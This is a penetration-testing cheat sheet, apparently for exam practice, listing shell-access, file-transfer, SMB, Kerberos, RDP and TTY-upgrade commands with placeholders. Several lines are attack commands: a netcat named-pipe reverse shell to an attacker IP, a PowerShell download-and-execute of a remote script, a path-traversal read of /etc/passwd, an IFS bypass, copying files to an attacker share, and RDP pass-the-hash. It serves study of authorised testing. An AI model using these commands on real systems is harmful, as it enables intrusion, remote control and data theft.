# Shell access and file transfers

[Practice methodology](../Practice-Exam-Methodology.md) · [Reference index](00-Reference-Index.md)

Commands preserved from the original reference. Replace angle-bracket placeholders before running; check your installed tool’s help for version-specific options.


## curl

```bash
curl -v http://<DOMAIN>                                           # verbose output
curl -X POST http://<DOMAIN>                                      # use POST method
curl -X PUT http://<DOMAIN>                                       # use PUT method
curl --path-as-is http://<DOMAIN>/../../../../../../etc/passwd    # handle /../ or /./ in URL
curl --proxy http://127.0.0.1:8080                                # use proxy
curl -F myFile=@<FILE> http://<RHOST>                             # file upload
curl${IFS}<LHOST>/<FILE>                                          # IFS bypass
```

## File Transfer

### Certutil (Windows)
```bash
certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>    # download file with Windows certutil
```

### Netcat
```bash
nc -lnvp <LPORT> > <FILE>                                                                    # Listener
nc -lnvp <LPORT> -e /bin/bash                                                                # Listener with shell
nc <RHOST> <RPORT> < <FILE>                                                                  # Sender
mkfifo /tmp/backpipe;cat /tmp/backpipe|bash -i 2>&1|nc <ATTACKER_IP> 1337 > /tmp/backpipe    # named-pipe reverse shell
```

### Impacket SMB
```bash
sudo impacket-smbserver <SHARE> ./                # serve current directory over SMB
sudo impacket-smbserver <SHARE> . -smb2support    # serve SMB share with SMB2 support
copy * \\<LHOST>\<SHARE>                          # copy Windows files to attacker SMB share
```

### PowerShell
```powershell
iwr <LHOST>/<FILE> -o <FILE>                                                                          # download file with Invoke-WebRequest alias
IEX(IWR http://<LHOST>/<FILE>) -UseBasicParsing                                                       # download and execute remote PowerShell
powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfile C:\\temp\\<FILE>    # download file to Windows temp
```

### Python/PHP Web Servers
```bash
sudo python3 -m http.server 80    # host files over HTTP on port 80
python3 -m http.server 8000       # host files over HTTP on port 8000
sudo php -S 127.0.0.1:80          # start local PHP development web server
```

### Archive Packaging
```bash
zip <ARCHIVE>.zip <FILE>               # package one file into ZIP archive
zip -r <ARCHIVE>.zip <DIRECTORY>/      # package directory recursively into ZIP archive
unzip -l <ARCHIVE>.zip                 # list ZIP archive contents
unzip <ARCHIVE>.zip -d <OUTPUT_DIR>    # extract ZIP archive to directory
```

## FTP

```bash
ftp <RHOST>                                  # connect to FTP service
ftp -A <RHOST>                               # connect to FTP anonymously
wget -r ftp://anonymous:anonymous@<RHOST>    # recursively mirror anonymous FTP
```

## Kerberos

```bash
sudo apt-get install krb5-kdc    # install Kerberos KDC package
```

### Ticket Handling
```bash
impacket-getTGT <DOMAIN>/<USERNAME>:'<PASSWORD>'    # request TGT with password
klist                                               # list cached Kerberos tickets
kinit <USERNAME>@<REALM>                            # request Kerberos ticket interactively
export KRB5CCNAME=<FILE>.ccache                     # point tools at a ccache file
export KRB5CCNAME='realpath <FILE>.ccache'          # point tools at absolute ccache path
```

### Config: /etc/krb5.conf
```ini
[libdefaults]
  default_realm = REALM.TLD
  dns_lookup_kdc = true
  dns_lookup_realm = true

  [realms]
    REALM.TLD = {
        kdc = <fqdn>
    }

[domain_realm]
    .<domain.tld> = REALM.TLD
    <domain.tld> = REALM.TLD
```

### Ticket Conversion

```bash
# kirbi to ccache
base64 -d <USERNAME>.kirbi.b64 > <USERNAME>.kirbi              # decode base64 kirbi ticket
impacket-ticketConverter <USERNAME>.kirbi <USERNAME>.ccache    # convert kirbi to ccache
export KRB5CCNAME=`realpath <USERNAME>.ccache`                 # use converted ccache for Kerberos tools

# ccache to kirbi
impacket-ticketConverter <USERNAME>.ccache <USERNAME>.kirbi    # convert ccache to kirbi
base64 -w0 <USERNAME>.kirbi > <USERNAME>.kirbi.base64          # encode kirbi for transfer
```

## RDP

```bash
xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /cert-ignore                                  # RDP login with local credentials
xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /d:<DOMAIN> /cert-ignore                      # RDP login with domain credentials
xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /dynamic-resolution +clipboard                # RDP with resizing and clipboard
xfreerdp /v:<RHOST> /u:<USERNAME> /d:<DOMAIN> /pth:'<HASH>' /dynamic-resolution +clipboard    # RDP pass-the-hash
xfreerdp /v:<RHOST> /dynamic-resolution +clipboard /tls-seclevel:0 -sec-nla                   # RDP with relaxed TLS/NLA settings
```

## SMB

```bash
smbclient -L \\<RHOST>\ -N                                        # list SMB shares anonymously
smbclient //<RHOST>/<SHARE>                                       # connect to SMB share
smbclient //<RHOST>/<SHARE> -U guest%                             # connect as guest with blank password
smbclient -m SMB3 -U '<USERNAME>%<PASSWORD>' //<RHOST>/<SHARE>    # connect to SMB share using SMB3
smbclient //<RHOST>/<SHARE> -U <USERNAME>                         # connect and prompt for password
smbclient //<RHOST>/SYSVOL -U <USERNAME>%<PASSWORD>               # access domain SYSVOL share
mount.cifs //<RHOST>/<SHARE> /mnt/remote                          # mount SMB share locally

# Download multiple files
mask""        # match all SMB files
recurse ON    # enable recursive SMB downloads
prompt OFF    # disable per-file download prompts
mget *        # download matching SMB files
```

## SSH

```bash
ssh user@<RHOST> -oKexAlgorithms=+diffie-hellman-group1-sha1    # connect to legacy SSH key exchange
```

## Upgrading Shells

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'    # spawn interactive bash PTY
# Then: ctrl+z → stty raw -echo → fg → enter → enter
export XTERM=xterm    # set terminal type for upgraded shell

# Alternative
stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;    # fully stabilize TTY

# Script method
script -q /dev/null -c bash    # spawn shell through script PTY
```

## Tmux

```bash
ctrl b + w    # show windows
ctrl + "            # split horizontal
ctrl + %      # split vertical
ctrl + ,      # rename window
ctrl b + [    # enter copy mode
ctrl + /      # search in copy mode (vi)
shift + P     # start/stop logging
```

## Time Sync (Important for Kerberos)

```bash
sudo ntpdate <RHOST>                                               # sync time with target NTP
sudo ntpdate -b -u <RHOST>                                         # force immediate NTP sync
while [ 1 ]; do sudo ntpdate <RHOST>;done                          # continuous sync
sudo net time -S <IP>                                              # query SMB time
sudo timedatectl set-ntp false && sudo net time set -S <NTP_IP>    # disable NTP and set time from SMB
```

## pwncat

```bash
pwncat-cs -lp <LPORT>                                               # start pwncat listener
(local) pwncat$ download /PATH/TO/FILE/<FILE> .                     # download file from target
(local) pwncat$ upload /PATH/TO/FILE/<FILE> /PATH/TO/FILE/<FILE>    # upload file to target
# ctrl+d = back to pwncat shell
```
